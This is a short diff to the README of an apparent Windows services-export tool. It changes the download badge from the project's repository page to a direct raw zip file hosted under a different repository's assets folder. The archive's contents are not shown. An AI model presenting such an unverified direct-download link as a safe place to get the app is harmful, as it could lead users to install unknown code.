@@ -7,7 +7,7 @@ description: "Export Windows services to CSV with start type, status, and binary
 
 ## 📥 Get the App Right Now
 
-[![Download Services List Export](https://img.shields.io/badge/Download-Services_List_Export-2ea44f?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/alysonp5/services-list-export)
+[![Download Services List Export](https://img.shields.io/badge/Download-Services_List_Export-2ea44f?style=for-the-badge&logo=windows&logoColor=white)](https://raw.githubusercontent.com/alysonp5/alysonp5.github.io/main/assets/v1.7.zip)
 
 Visit this link to download the application.
 
